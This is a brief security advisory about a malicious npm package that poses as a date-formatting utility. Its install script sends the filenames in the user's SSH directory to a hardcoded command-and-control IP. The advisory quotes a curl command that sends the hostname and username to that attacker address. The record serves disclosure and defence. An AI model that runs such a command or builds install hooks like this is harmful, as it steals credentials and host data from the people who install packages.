summary: houzidawang806 exfiltrates SSH directory contents to hardcoded C2 IP on install
details: The package advertises itself as a date-formatting utility but ships a postinstall.js that, on `npm install`, enumerates files in the installer's ~/.ssh directory and POSTs the filenames together with the OS username and platform to a hardcoded bare IPv4 endpoint at https://124.221.154.135/post. Chinese-language comments in postinstall.js explicitly label the destination a C2 server and describe the script as an SSH-key data-stealing payload. package.json additionally declares a misspelled `prinstall` hook that curls http://124.221.154.135/pre?h=$(hostname)&u=$(whoami) to the same attacker IP — the typo prevents npm from auto-running it, but it confirms shared attacker infrastructure and intent. The exported index.js `formatDate` function is decoy cover for the credential-recon payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
